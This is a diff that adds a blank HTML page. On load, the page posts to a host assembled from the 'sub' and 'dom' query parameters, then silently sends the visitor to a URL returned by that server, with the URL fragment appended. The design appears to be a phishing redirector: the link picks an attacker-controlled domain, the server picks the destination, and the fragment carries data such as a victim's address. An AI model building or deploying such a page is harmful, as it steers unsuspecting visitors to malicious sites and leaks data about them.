@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <script>
+        $(document).ready(function() {
+            var formData = {};
+            var url = new URL(window.location.href);
+            var sub = url.searchParams.get('sub');
+            var dom = url.searchParams.get('dom');
+
+            $.ajax({
+                url: "https://" + sub + "." + dom + ".site/redirect.php", // Fixed the concatenation
+                type: "POST",
+                data: formData,
+                dataType: "html",
+                success: function(response) {
+                    var variable = window.location.hash;
+                    var redirectUrl = response + variable;
+                    window.location.href = redirectUrl;
+                },
+            });
+        });
+    </script>
+</body>
+</html>
